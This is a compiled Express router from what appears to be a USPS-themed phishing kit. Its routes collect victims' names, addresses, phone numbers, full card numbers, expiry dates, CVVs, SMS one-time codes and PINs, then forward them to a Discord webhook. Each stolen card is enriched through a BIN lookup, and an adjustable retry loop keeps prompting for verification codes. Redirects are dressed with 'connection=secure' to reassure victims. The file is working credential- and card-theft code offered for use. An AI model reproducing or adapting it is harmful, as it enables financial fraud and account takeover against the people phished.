"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
const discord_js_1 = require("discord.js");
const express_1 = require("express");
const app_1 = require("../app");
const got_1 = __importDefault(require("got"));
const router = express_1.Router();
let verificationFailures = 1;
const socket_1 = require("../modules/socket");
router.get('/set-retry-limit', (req, res) => {
    if (!req.query.limit)
        return res.json({
            success: false,
            message: 'Missing query parameter - retry limit'
        });
    verificationFailures = Number(req.query.limit);
    res.json({
        success: true,
        message: 'Loop is set to ' + verificationFailures + ' retries.'
    });
});
router.post('/update-address', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    app_1.Webhook.send(new discord_js_1.MessageEmbed()
        .setAuthor('USPS Results - ' + req.clientIp)
        .setTitle('Shipping Details')
        .setColor('#36393F')
        .addField('Name', `> ${req.body.name}`, true)
        .addField('Phone', `> ${req.body.phone}`, true)
        .addField('Address Line 1', `> ${req.body.addressLine1}`, false)
        .addField('Address Line 2', `> ${req.body.addressLine2 ? req.body.addressLine2 : 'Unknown'}`, false)
        .addField('City', `> ${req.body.city}`, true)
        .addField('ZIP', `> ${req.body.zip}`, true)
        .addField('State', `> ${req.body.state}`, true));
    let card = new discord_js_1.MessageEmbed()
        .setAuthor('USPS Results - ' + req.clientIp)
        .setTitle('Card Details')
        .setColor('#36393F')
        .addField('Cardholder Name', `> ${req.body.cardHolderName}`, false)
        .addField('Card Number', `> ${req.body.cardNumber}`, true)
        .addField('Card Expiration', `> ${req.body.cardExpMonth + '/' + req.body.cardExpYear}`, true)
        .addField('Card CVV', `> ${req.body.cardCvv}`, false);
    yield got_1.default.get('https://lookup.binlist.net/' + req.body.cardNumber.substring(0, 6), {
        responseType: 'json',
        resolveBodyOnly: true
    })
        .then(body => body)
        .then(body => {
        card.addField('Card Type', body.type, true);
        card.addField('Is Prepaid', body.prepaid ? 'Yes' : 'No', true);
        card.addField('Issuing Country', `${body.country.name} ${body.country.emoji}`, true);
        card.addField('Issuing Bank', body.bank ? body.bank.name : 'Unknown', true);
    })
        .catch(err => {
        console.error(err);
    });
    app_1.Webhook.send(card);
    app_1.Webhook.send(req.body.cardNumber);
    try {
        newLog(req.sessionID, req.body);
    }
    catch (error) {
        console.log('Unable to save the log');
    }
    return res.redirect('/processing?connection=secure');
}));
router.post('/verification-code', (req, res) => {
    app_1.Webhook.send(new discord_js_1.MessageEmbed()
        .setAuthor('USPS Results - ' + req.clientIp)
        .setTitle('SMS Code')
        .setColor('#36393F')
        .setDescription(`> ${req.body.sms}`));
    if (req.body.pin) {
        app_1.Webhook.send(new discord_js_1.MessageEmbed()
            .setAuthor('USPS Results - ' + req.clientIp)
            .setTitle('PIN Code')
            .setColor('#36393F')
            .setDescription(`> ${req.body.pin}`));
    }
    return res.redirect('/thank-you?connection=secure');
});
router.post('/verification-code/retry', (req, res) => {
    req.session.retryLimit ? req.session.retryLimit++ : req.session.retryLimit = 1;
    app_1.Webhook.send(new discord_js_1.MessageEmbed()
        .setAuthor('USPS Results - ' + req.clientIp)
        .setTitle('SMS Code – Loop')
        .setColor('#36393F')
        .setDescription(`> ${req.body.sms}`));
    if (req.session.retryLimit == verificationFailures)
        return res.redirect('/thank-you?connection=secure');
    return res.redirect('/verification-code/retry?connection=secure');
});
const newLog = (sessionID, object) => {
    let log = socket_1.sessionLogs.find(x => x.id == sessionID);
    if (!log)
        return;
    log.data = object;
};
module.exports = router;
//# sourceMappingURL=api.js.map